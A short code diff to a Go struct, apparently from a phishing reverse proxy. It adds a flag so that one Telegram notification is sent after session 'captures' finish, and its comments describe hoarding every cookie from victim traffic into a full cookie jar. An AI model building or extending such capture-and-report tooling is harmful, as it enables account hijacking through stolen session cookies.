@@ -31,6 +31,10 @@ type ProxySession struct {
 	// client user-agent stored for analytics and logging
 	UserAgent string
 
+	// NotificationSent prevents duplicate Telegram notifications for the same session.
+	// Only one comprehensive notification is sent after all captures are complete.
+	NotificationSent atomic.Bool
+
 	// AllCookies accumulates ALL Set-Cookie values from ALL responses during the session.
 	// Key: "cookieName:domain", Value: map[string]string (cookie data)
 	// This provides a complete cookie jar similar to browser-level cookie dumps.
